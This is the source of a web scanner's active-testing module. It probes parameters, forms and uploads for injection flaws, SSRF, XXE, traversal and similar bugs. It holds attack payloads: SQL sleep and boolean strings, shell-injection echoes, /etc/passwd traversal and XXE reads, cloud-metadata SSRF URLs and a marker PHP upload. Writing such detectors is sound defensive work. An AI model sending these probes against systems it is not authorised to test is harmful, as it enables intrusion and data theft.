"""Active vulnerability tests.

These send crafted (but non-destructive) inputs to parameters and forms on a
target the user has *verified they own*, then analyse the response. No data is
modified, no brute force, no DoS — the payloads only read/reflect.

Covered: reflected XSS (HTML injection), error-based SQL injection, open redirect,
and path traversal / local file inclusion.
"""

from __future__ import annotations

import difflib
import re
import secrets
import time
from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse

import httpx

from .checks import Finding
from .crawler import Form

# ---- signatures ----------------------------------------------------------

SQL_ERRORS = [
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"mysql_fetch",
    r"unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"pg_query\(\)|postgresql.*error|pg::syntaxerror",
    r"ora-\d{5}",
    r"sqlite3?::|sqlite_error|near \".*\": syntax error",
    r"microsoft ole db provider for sql server",
    r"odbc sql server driver",
    r"sqlstate\[",
]
SQL_RE = re.compile("|".join(SQL_ERRORS), re.IGNORECASE)

PASSWD_RE = re.compile(r"root:.*:0:0:")
WIN_INI_RE = re.compile(r"\[(fonts|extensions|mci extensions)\]", re.IGNORECASE)

REDIRECT_HINT_PARAMS = {"url", "redirect", "redirect_url", "next", "return", "returnurl",
                        "return_url", "dest", "destination", "continue", "goto", "r", "u"}

TRAVERSAL_PAYLOADS = ["../../../../../../../../etc/passwd", "....//....//....//etc/passwd",
                      "..\\..\\..\\..\\..\\..\\windows\\win.ini"]

# Command injection: arithmetic output (191*7=1337) proves execution, not mere
# reflection (the literal payload never contains "1337").
CMDI_PAYLOADS = [
    ";echo sfci$((191*7))", "|echo sfci$((191*7))", "&&echo sfci$((191*7))",
    "`echo sfci$((191*7))`", "$(echo sfci$((191*7)))", "& set /a 191*7",
]
NOSQL_ERRORS = re.compile(
    r"(mongoerror|mongodb|bson|casterror|couchdberror|\$where|unexpected token '\$'|"
    r"e11000|failed to parse)", re.IGNORECASE)
LDAP_ERRORS = re.compile(
    r"(javax\.naming\.|com\.sun\.jndi\.ldap|ldapexception|invalid dn syntax|"
    r"not a valid ldap|nameNotFoundException|ldap_search)", re.IGNORECASE)
XPATH_ERRORS = re.compile(
    r"(xpathexception|xpath_eval|xmlxpatheval|invalid xpath|sxxp0003|"
    r"MS\.Internal\.Xml|Warning: xpath|System\.Xml\.XPath)", re.IGNORECASE)

# SSRF probes: (payload URL, signature that proves the server fetched it)
SSRF_PROBES = [
    ("http://169.254.169.254/latest/meta-data/", re.compile(r"ami-id|instance-id|iam/|placement/|hostname", re.I)),
    ("http://metadata.google.internal/computeMetadata/v1/", re.compile(r"computeMetadata|project-id|instance/", re.I)),
    ("file:///etc/passwd", re.compile(r"root:.*:0:0:")),
]

# Stack-trace / verbose-error signatures (A10 Mishandling of Exceptional Conditions).
STACKTRACE_RE = re.compile(
    r"(traceback \(most recent call last\)|exception in thread|"
    r"at [\w.$]+\([\w.]+\.java:\d+\)|php (fatal|warning|parse) error|"
    r"system\.\w+exception|org\.springframework|werkzeug\.exceptions|"
    r"stack trace:|<b>fatal error</b>)",
    re.IGNORECASE,
)


def _with_param(url: str, name: str, value: str) -> str:
    parts = urlparse(url)
    qs = parse_qs(parts.query, keep_blank_values=True)
    qs[name] = [value]
    new_q = urlencode({k: v[0] for k, v in qs.items()})
    return urlunparse(parts._replace(query=new_q))


def _get(client: httpx.Client, url: str, allow_redirects: bool = True):
    try:
        return client.get(url, follow_redirects=allow_redirects)
    except httpx.HTTPError:
        return None


# ---- individual tests ----------------------------------------------------

def _xss(client: httpx.Client, url: str, param: str) -> Finding | None:
    token = secrets.token_hex(4)
    marker = f"sfx{token}"
    payload = f'"><{marker}>'
    r = _get(client, _with_param(url, param, payload))
    if r is None:
        return None
    # The raw, un-encoded marker tag appearing in the body means HTML injection.
    if f"<{marker}>" in r.text:
        return Finding(
            check_id=f"xss-reflected-{param}", title="Reflected Cross-Site Scripting (XSS)",
            severity="high", url=_with_param(url, param, payload),
            description=f"Input in the '{param}' parameter is reflected into the HTML response without encoding.",
            impact="An attacker can inject scripts that run in victims' browsers to steal sessions or data.",
            evidence=f"Injected '{payload}' and the raw tag <{marker}> was reflected unescaped.",
            remediation="Context-aware output encoding for all user input; add a strict Content-Security-Policy.",
            compliance_ref="OWASP A03:2021",
        )
    return None


def _sqli(client: httpx.Client, url: str, param: str, baseline: str | None) -> Finding | None:
    r = _get(client, _with_param(url, param, "'"))
    if r is None:
        return None
    if SQL_RE.search(r.text) and (baseline is None or not SQL_RE.search(baseline)):
        m = SQL_RE.search(r.text)
        return Finding(
            check_id=f"sqli-{param}", title="SQL Injection", severity="critical",
            url=_with_param(url, param, "'"),
            description=f"A database error is triggered by injecting a quote into the '{param}' parameter.",
            impact="SQL injection can expose or modify the entire database, including credentials.",
            evidence=f"Error signature returned: '{m.group(0)[:80]}'",
            remediation="Use parameterised queries / prepared statements; never concatenate user input into SQL.",
            compliance_ref="OWASP A03:2021",
        )
    return None


def _sim(a: str, b: str) -> float:
    """Response-body similarity in [0,1] (bounded for speed)."""
    return difflib.SequenceMatcher(None, a[:4000], b[:4000]).ratio()


def _timed_get(client: httpx.Client, url: str, timeout: float):
    """GET returning (response, elapsed_seconds); (None, None) on error."""
    start = time.perf_counter()
    try:
        r = client.get(url, follow_redirects=True, timeout=timeout)
    except httpx.HTTPError:
        return None, None
    return r, time.perf_counter() - start


# Boolean pairs: (TRUE_a, FALSE_a, TRUE_b, FALSE_b). A genuinely injectable
# parameter makes TRUE≠FALSE while the two TRUEs (and two FALSEs) stay alike.
_BOOL_PAIRS = [
    ("1' AND '1'='1", "1' AND '1'='2", "1' AND '7'='7", "1' AND '7'='8"),   # single-quote string context
    ("1 AND 1=1", "1 AND 1=2", "1 AND 7=7", "1 AND 7=8"),                    # numeric context
    ('1" AND "1"="1', '1" AND "1"="2', '1" AND "7"="7', '1" AND "7"="8'),    # double-quote string context
]

# Time-delay payloads across engines; {d} = seconds. SLEEP(0) is the control.
_TIME_PAYLOADS = [
    "1' AND SLEEP({d})-- -", "1 AND SLEEP({d})", "1' AND SLEEP({d}) AND '1'='1",
    "1'; WAITFOR DELAY '0:0:{d}'-- -", "1' AND pg_sleep({d})-- -", "1); SELECT pg_sleep({d})-- -",
]


def _blind_sqli(client: httpx.Client, url: str, param: str) -> Finding | None:
    """Blind SQL injection — boolean-based (content diff) and time-based (timing)."""
    # ---- Boolean-based: TRUE vs FALSE must differ, TRUE vs TRUE must match ----
    for t1, f1, t2, f2 in _BOOL_PAIRS:
        rt1 = _get(client, _with_param(url, param, t1))
        rf1 = _get(client, _with_param(url, param, f1))
        if rt1 is None or rf1 is None or rt1.status_code >= 500 or rf1.status_code >= 500:
            continue
        if _sim(rt1.text, rf1.text) >= 0.95:
            continue  # TRUE and FALSE look identical → not boolean-injectable here
        rt2 = _get(client, _with_param(url, param, t2))
        rf2 = _get(client, _with_param(url, param, f2))
        if rt2 is None or rf2 is None:
            continue
        # Confirm: the two TRUE responses agree, the two FALSE responses agree,
        # and TRUE clearly differs from FALSE — rules out reflection/randomness.
        if (_sim(rt1.text, rt2.text) > 0.95 and _sim(rf1.text, rf2.text) > 0.95
                and _sim(rt1.text, rf1.text) < 0.9):
            return Finding(
                check_id=f"sqli-blind-boolean-{param}", title="Blind SQL Injection (boolean-based)",
                severity="critical", url=_with_param(url, param, t1),
                description=f"The '{param}' parameter is injectable: a TRUE condition (AND 1=1) and a FALSE "
                            f"condition (AND 1=2) produce reliably different responses.",
                impact="Blind SQLi lets an attacker extract the database one boolean at a time — no error needed.",
                evidence=f"sim(TRUE,FALSE)={_sim(rt1.text, rf1.text):.2f} while sim(TRUE,TRUE)>{0.95}.",
                remediation="Use parameterised queries / prepared statements; never concatenate input into SQL.",
                compliance_ref="OWASP A03:2021",
            )

    # ---- Time-based: a SLEEP payload delays the response, SLEEP(0) does not ----
    delay = 4
    _, base_t = _timed_get(client, _with_param(url, param, "1"), timeout=delay + 8)
    if base_t is None:
        return None
    for tpl in _TIME_PAYLOADS:
        _, hi_t = _timed_get(client, _with_param(url, param, tpl.format(d=delay)), timeout=delay + 10)
        if hi_t is None or hi_t < base_t + (delay - 1):
            continue  # no clear delay
        # Control: same payload with a 0-second sleep must return fast.
        _, lo_t = _timed_get(client, _with_param(url, param, tpl.format(d=0)), timeout=delay + 8)
        if lo_t is not None and lo_t < base_t + (delay - 2):
            return Finding(
                check_id=f"sqli-blind-time-{param}", title="Blind SQL Injection (time-based)",
                severity="critical", url=_with_param(url, param, tpl.format(d=delay)),
                description=f"Injecting a time-delay payload into '{param}' makes the server pause ~{delay}s, "
                            f"while the same payload with a 0-second delay returns immediately.",
                impact="Time-based blind SQLi confirms code execution in the database even with no visible output.",
                evidence=f"delay-payload={hi_t:.1f}s vs baseline={base_t:.1f}s and 0s-control={lo_t:.1f}s.",
                remediation="Use parameterised queries / prepared statements; never concatenate input into SQL.",
                compliance_ref="OWASP A03:2021",
            )
    return None


def _ldap(client: httpx.Client, url: str, param: str, baseline: str | None) -> Finding | None:
    for payload in ("*)(&", "*))%00", "admin*)((|"):
        r = _get(client, _with_param(url, param, payload))
        if r is None:
            continue
        if LDAP_ERRORS.search(r.text) and (baseline is None or not LDAP_ERRORS.search(baseline)):
            return Finding(
                check_id=f"ldap-injection-{param}", title="LDAP Injection", severity="high",
                url=_with_param(url, param, payload),
                description=f"An LDAP error is triggered by injecting special characters into '{param}'.",
                impact="LDAP injection can bypass authentication and read directory data.",
                evidence=f"LDAP error signature returned for payload '{payload}'.",
                remediation="Escape LDAP special characters and use parameterised directory queries.",
                compliance_ref="OWASP A05:2025",
            )
    return None


def _xpath(client: httpx.Client, url: str, param: str, baseline: str | None) -> Finding | None:
    for payload in ("'", "']", "\"))"):
        r = _get(client, _with_param(url, param, payload))
        if r is None:
            continue
        if XPATH_ERRORS.search(r.text) and (baseline is None or not XPATH_ERRORS.search(baseline)):
            return Finding(
                check_id=f"xpath-injection-{param}", title="XPath Injection", severity="high",
                url=_with_param(url, param, payload),
                description=f"An XPath error is triggered by injecting into the '{param}' parameter.",
                impact="XPath injection can bypass auth and extract data from XML documents.",
                evidence=f"XPath error signature returned for payload '{payload}'.",
                remediation="Use parameterised XPath queries; never concatenate user input into XPath.",
                compliance_ref="OWASP A05:2025",
            )
    return None


_FRAMEWORK_RE = re.compile(r"ng-app|ng-controller|angular\.|\bv-app\b|data-v-|__vue__|vue(?:\.min)?\.js", re.I)


def _csti(client: httpx.Client, url: str, param: str) -> Finding | None:
    payload = "{{7*191}}"
    r = _get(client, _with_param(url, param, payload))
    if r is None:
        return None
    # Reflected verbatim (server did NOT evaluate it) into a client-side framework page.
    if payload in r.text and "1337" not in r.text and _FRAMEWORK_RE.search(r.text):
        return Finding(
            check_id=f"csti-{param}", title="Client-Side Template Injection (Angular/Vue)", severity="high",
            url=_with_param(url, param, payload),
            description=f"The '{param}' value is reflected into a client-side template framework.",
            impact="CSTI lets attackers run JavaScript in victims' browsers (sandbox-escape → XSS).",
            evidence=f"Injected '{payload}' reflected verbatim into an Angular/Vue page.",
            remediation="Never render user input inside client-side templates; treat it as text/data.",
            compliance_ref="OWASP A03:2021",
        )
    return None


def _ssi(client: httpx.Client, url: str, param: str) -> Finding | None:
    marker = "sfssi" + secrets.token_hex(3)
    payload = f'<!--#exec cmd="echo {marker}"-->'
    r = _get(client, _with_param(url, param, payload))
    if r is None:
        return None
    # Executed if the echo output appears but the raw directive was consumed.
    if marker in r.text and "#exec" not in r.text:
        return Finding(
            check_id=f"ssi-injection-{param}", title="Server-Side Includes (SSI) Injection", severity="high",
            url=_with_param(url, param, payload),
            description=f"The '{param}' parameter is processed by the server's SSI engine.",
            impact="SSI injection can read files and execute commands on the server.",
            evidence=f"Injected an SSI #exec directive; its echo output '{marker}' appeared, directive consumed.",
            remediation="Disable SSI exec, and never pass user input into SSI-processed pages.",
            compliance_ref="OWASP A05:2025",
        )
    return None


def _open_redirect(client: httpx.Client, url: str, param: str) -> Finding | None:
    evil = "https://evil.example.com/"
    r = _get(client, _with_param(url, param, evil), allow_redirects=False)
    if r is None:
        return None
    loc = r.headers.get("location", "")
    if r.status_code in (301, 302, 303, 307, 308) and loc.startswith("https://evil.example.com"):
        return Finding(
            check_id=f"open-redirect-{param}", title="Open Redirect", severity="medium",
            url=_with_param(url, param, evil),
            description=f"The '{param}' parameter redirects to an arbitrary external URL.",
            impact="Attackers use open redirects for convincing phishing links that appear to originate from your domain.",
            evidence=f"Set {param}={evil} → HTTP {r.status_code}, Location: {loc[:80]}",
            remediation="Allow-list permitted redirect destinations; reject absolute external URLs.",
            compliance_ref="OWASP A01:2021",
        )
    return None


def _ssti(client: httpx.Client, url: str, param: str) -> Finding | None:
    # Unique arithmetic (7*191=1337) is unlikely to appear by coincidence.
    for payload, expect in (("{{7*191}}", "1337"), ("${7*191}", "1337"), ("#{7*191}", "1337")):
        r = _get(client, _with_param(url, param, payload))
        if r is None:
            continue
        if expect in r.text and payload not in r.text:
            return Finding(
                check_id=f"ssti-{param}", title="Server-Side Template Injection (SSTI)",
                severity="critical", url=_with_param(url, param, payload),
                description=f"The '{param}' parameter is evaluated by a server-side template engine.",
                impact="SSTI often leads to remote code execution on the server.",
                evidence=f"Injected '{payload}' and the server returned the evaluated result '{expect}'.",
                remediation="Never render user input as a template; use a sandboxed engine and static templates.",
                compliance_ref="OWASP A05:2025",
            )
    return None


def _crlf(client: httpx.Client, url: str, param: str) -> Finding | None:
    payload = "sf%0d%0aX-SF-Injected:%20sfcrlf"
    # Some stacks decode the value into a header — check the RESPONSE headers.
    r = _get(client, _with_param(url, param, payload), allow_redirects=False)
    if r is None:
        return None
    if r.headers.get("x-sf-injected", "").strip() == "sfcrlf":
        return Finding(
            check_id=f"crlf-{param}", title="HTTP Response Splitting (CRLF Injection)",
            severity="high", url=_with_param(url, param, payload),
            description=f"CRLF characters in the '{param}' parameter inject new response headers.",
            impact="Attackers can set cookies, poison caches, or split responses.",
            evidence="Injected CRLF produced header 'X-SF-Injected: sfcrlf' in the response.",
            remediation="Strip CR/LF from any user input placed into response headers.",
            compliance_ref="OWASP A05:2025",
        )
    return None


def _traversal(client: httpx.Client, url: str, param: str) -> Finding | None:
    for payload in TRAVERSAL_PAYLOADS:
        r = _get(client, _with_param(url, param, payload))
        if r is None:
            continue
        if PASSWD_RE.search(r.text) or WIN_INI_RE.search(r.text):
            return Finding(
                check_id=f"path-traversal-{param}", title="Path Traversal / Local File Inclusion",
                severity="high", url=_with_param(url, param, payload),
                description=f"The '{param}' parameter can read files outside the web root.",
                impact="Attackers can read sensitive files (config, credentials, source) from the server.",
                evidence=f"Payload '{payload}' returned OS file contents.",
                remediation="Never pass user input to file paths; canonicalise and allow-list, or use opaque IDs.",
                compliance_ref="OWASP A01:2021",
            )
    return None


def _cmdi(client: httpx.Client, url: str, param: str) -> Finding | None:
    # "1337" only appears if the shell evaluated 191*7 — not from reflecting the payload.
    for payload in CMDI_PAYLOADS:
        r = _get(client, _with_param(url, param, payload))
        if r is None:
            continue
        if "sfci1337" in r.text or ("1337" in r.text and "191" not in r.text and payload not in r.text):
            return Finding(
                check_id=f"cmdi-{param}", title="OS Command Injection", severity="critical",
                url=_with_param(url, param, payload),
                description=f"The '{param}' parameter is passed to a system shell.",
                impact="Command injection gives an attacker arbitrary command execution on the server.",
                evidence=f"Injected '{payload}' and the shell evaluated 191*7 → 1337 in the response.",
                remediation="Never pass user input to a shell; use parameterised APIs and strict allow-lists.",
                compliance_ref="OWASP A05:2025",
            )
    return None


def _ssrf(client: httpx.Client, url: str, param: str) -> Finding | None:
    for payload, sig in SSRF_PROBES:
        r = _get(client, _with_param(url, param, payload))
        if r is None:
            continue
        if sig.search(r.text):
            return Finding(
                check_id=f"ssrf-{param}", title="Server-Side Request Forgery (SSRF)",
                severity="high", url=_with_param(url, param, payload),
                description=f"The '{param}' parameter makes the server fetch an attacker-controlled URL.",
                impact="SSRF can reach internal services and cloud metadata to steal credentials.",
                evidence=f"Injected '{payload}' and the response contained internal/metadata content.",
                remediation="Allow-list outbound hosts; block internal ranges and cloud metadata IPs.",
                compliance_ref="OWASP A01:2025",
            )
    return None


def _nosql(client: httpx.Client, url: str, param: str, baseline: str | None) -> Finding | None:
    for payload in ('"', "'\"", "[$ne]", "';return true;var x='"):
        r = _get(client, _with_param(url, param, payload))
        if r is None:
            continue
        if NOSQL_ERRORS.search(r.text) and (baseline is None or not NOSQL_ERRORS.search(baseline)):
            m = NOSQL_ERRORS.search(r.text)
            return Finding(
                check_id=f"nosqli-{param}", title="NoSQL Injection", severity="high",
                url=_with_param(url, param, payload),
                description=f"A NoSQL database error is triggered via the '{param}' parameter.",
                impact="NoSQL injection can bypass authentication or expose/modify database records.",
                evidence=f"Error signature: '{m.group(0)[:80]}'",
                remediation="Validate and type-cast input; use safe query builders, never raw operators from input.",
                compliance_ref="OWASP A05:2025",
            )
    return None


# ---- orchestration -------------------------------------------------------

def test_param_url(client: httpx.Client, url: str) -> list[Finding]:
    params = list(parse_qs(urlparse(url).query, keep_blank_values=True).keys())
    if not params:
        return []
    baseline_resp = _get(client, url)
    baseline = baseline_resp.text if baseline_resp is not None else None

    findings: list[Finding] = []
    saw_stacktrace = False
    baseline_tests = (_sqli, _nosql, _ldap, _xpath)  # these compare against the baseline response
    for p in params:
        for test in (_xss, _sqli, _blind_sqli, _open_redirect, _traversal, _ssti, _crlf, _cmdi, _ssrf, _nosql, _ldap, _xpath, _csti, _ssi):
            try:
                f = test(client, url, p, baseline) if test in baseline_tests else test(client, url, p)
            except httpx.HTTPError:
                continue
            if f:
                findings.append(f)
        # Verbose-error / stack-trace disclosure (A10) — probe with a malformed value.
        if not saw_stacktrace:
            r = _get(client, _with_param(url, p, "sf'\"<>{{"))
            if r is not None and STACKTRACE_RE.search(r.text) and (baseline is None or not STACKTRACE_RE.search(baseline)):
                saw_stacktrace = True
                findings.append(Finding(
                    check_id="verbose-error", title="Verbose error / stack trace disclosure",
                    severity="low", url=url,
                    description="The application returns internal stack traces on malformed input.",
                    impact="Stack traces reveal frameworks, file paths and logic that aid further attacks.",
                    evidence="A server stack trace was returned in the response body.",
                    remediation="Return generic error pages; log details server-side only.",
                    compliance_ref="OWASP A10:2025",
                ))
    return findings


_XXE_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<!DOCTYPE sf [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
    "<sf>&xxe;</sf>"
)
_XXE_HINT = re.compile(r"/(api|xml|soap|rpc|service|feed|upload|import|ws)\b", re.I)


def test_xxe(client: httpx.Client, base_url: str, param_urls: list[str], max_urls: int = 6) -> list[Finding]:
    """Send an in-band XXE payload to XML-ish endpoints; flag if a local file leaks."""
    targets = [base_url] + [u for u in param_urls if _XXE_HINT.search(urlparse(u).path)]
    seen: set[str] = set()
    findings: list[Finding] = []
    for url in targets[:max_urls]:
        base = url.split("?")[0]
        if base in seen:
            continue
        seen.add(base)
        try:
            r = client.post(base, content=_XXE_PAYLOAD.encode(),
                            headers={"Content-Type": "application/xml"})
        except httpx.HTTPError:
            continue
        if r is not None and PASSWD_RE.search(r.text):
            findings.append(Finding(
                check_id="xxe", title="XML External Entity (XXE) Injection", severity="high", url=base,
                description="The endpoint parses XML with external entities enabled and returns local file contents.",
                impact="Attackers can read server files, and XXE can escalate to SSRF or denial of service.",
                evidence="An XXE payload referencing file:///etc/passwd returned OS file contents.",
                remediation="Disable external entities and DTD processing in the XML parser.",
                compliance_ref="OWASP A05:2025",
            ))
            break
    return findings


def test_stored_xss(client: httpx.Client, forms: list[Form], pages: list[str],
                    max_forms: int = 5, max_pages: int = 15) -> list[Finding]:
    """Submit a unique marker through forms, then look for it reflected unescaped
    on any page — a stored / second-order XSS signal."""
    marker = "sfstor" + secrets.token_hex(4)
    payload = f'"><{marker}>'
    submitted: list[str] = []
    for form in forms[:max_forms]:
        data = {n: payload for n in form.inputs}
        try:
            if form.method == "post":
                client.post(form.action, data=data)
            else:
                client.get(form.action, params=data)
            submitted.append(form.action)
        except httpx.HTTPError:
            continue
    if not submitted:
        return []
    for url in list(dict.fromkeys(submitted + pages))[:max_pages]:
        try:
            r = client.get(url)
        except httpx.HTTPError:
            continue
        if f"<{marker}>" in r.text:
            return [Finding(
                check_id="stored-xss", title="Stored / Second-order XSS", severity="high", url=url,
                description="A value submitted through a form is later reflected into a page without encoding.",
                impact="Stored XSS runs for every visitor of the affected page — the most damaging XSS type.",
                evidence=f"Submitted marker '{payload}' was reflected unescaped at {url}.",
                remediation="Encode all stored user input on output; add a strict Content-Security-Policy.",
                compliance_ref="OWASP A03:2021",
            )]
    return []


_FILE_FIELD_RE = re.compile(r"file|upload|image|photo|attach|document|avatar|picture|logo|media", re.I)
_UPLOAD_DIRS = ["/uploads/", "/files/", "/media/", "/images/", "/upload/", "/attachments/", "/documents/", "/img/"]


def test_file_upload(client: httpx.Client, forms: list[Form], base_url: str, max_forms: int = 4) -> list[Finding]:
    """Upload a BENIGN marker file to upload forms, then test whether it is stored and
    (worse) executed as code. The payload only echoes a marker — it is not a real shell."""
    token = secrets.token_hex(4)
    marker = f"SFUP{token}"
    content = f"SFPHP<?php echo '{marker}';?>".encode()
    for form in forms[:max_forms]:
        if form.method != "post":
            continue
        file_field = next((n for n in form.inputs if _FILE_FIELD_RE.search(n)), None)
        if not file_field:
            continue
        data = {n: "test" for n in form.inputs if n != file_field}
        files = {file_field: (f"sf{token}.php", content, "image/jpeg")}
        try:
            r = client.post(form.action, data=data, files=files)
        except httpx.HTTPError:
            continue
        if r.status_code >= 400:
            continue
        candidates: list[str] = []
        m = re.search(r"[\w./\-]*sf" + token + r"[\w./\-]*\.php", r.text)
        if m:
            candidates.append(urljoin(base_url, m.group(0)))
        candidates += [urljoin(base_url, d + f"sf{token}.php") for d in _UPLOAD_DIRS]
        for url in dict.fromkeys(candidates):
            try:
                g = client.get(url)
            except httpx.HTTPError:
                continue
            if g.status_code == 200 and marker in g.text:
                if "<?php" not in g.text:  # PHP was executed → remote code execution
                    return [Finding(
                        "webshell-upload", "Unrestricted upload leading to code execution (webshell)",
                        "critical", url,
                        description="An uploaded .php file was stored and executed by the server.",
                        impact="Attackers can upload a webshell and run arbitrary commands — full server compromise.",
                        evidence=f"Uploaded a benign PHP file that executed (echoed {marker}) at {url}.",
                        remediation="Validate type/extension, store outside the web root, and never execute uploads.",
                        compliance_ref="OWASP A04:2025")]
                return [Finding(
                    "unrestricted-file-upload", "Unrestricted file upload", "high", url,
                    description="An arbitrary file type was uploaded and is publicly served.",
                    impact="Uploading arbitrary files enables stored XSS (SVG/HTML), malware hosting or later RCE.",
                    evidence=f"Uploaded sf{token}.php was stored and served at {url}.",
                    remediation="Allow-list safe types, rename files, store outside the web root, and scan uploads.",
                    compliance_ref="OWASP A04:2025")]
    return []


def test_host_header(client: httpx.Client, base_url: str) -> list[Finding]:
    """Detect Host header injection — a poisoned Host reflected into the page."""
    try:
        r = client.get(base_url, headers={"Host": "evil.sf-test.example"}, follow_redirects=False)
    except httpx.HTTPError:
        return []
    loc = r.headers.get("location", "")
    if "evil.sf-test.example" in loc or "evil.sf-test.example" in r.text:
        return [Finding(
            check_id="host-header-injection", title="Host Header Injection",
            severity="medium", url=base_url,
            description="A user-supplied Host header is reflected into responses or redirects.",
            impact="Enables password-reset poisoning, cache poisoning and phishing.",
            evidence="Injected Host 'evil.sf-test.example' was reflected back.",
            remediation="Validate the Host header against an allow-list of expected hostnames.",
            compliance_ref="OWASP A05:2025",
        )]
    return []


def test_form(client: httpx.Client, form: Form) -> list[Finding]:
    """Probe a form by injecting into each field (GET forms only for safety)."""
    if form.method != "get" or not form.inputs:
        return []
    # Represent the form as a param URL and reuse the URL tester.
    from urllib.parse import urlencode as _ue
    base = form.action + ("&" if urlparse(form.action).query else "?") + _ue({n: "test" for n in form.inputs})
    return test_param_url(client, base)


def run_active_tests(client: httpx.Client, param_urls: list[str], forms: list[Form],
                     max_urls: int = 15, max_forms: int = 10) -> list[Finding]:
    findings: list[Finding] = []
    for url in param_urls[:max_urls]:
        findings.extend(test_param_url(client, url))
    for form in forms[:max_forms]:
        findings.extend(test_form(client, form))
    # De-dupe by (check_id, url)
    seen = set()
    unique = []
    for f in findings:
        key = (f.check_id, f.url)
        if key not in seen:
            seen.add(key)
            unique.append(f)
    return unique
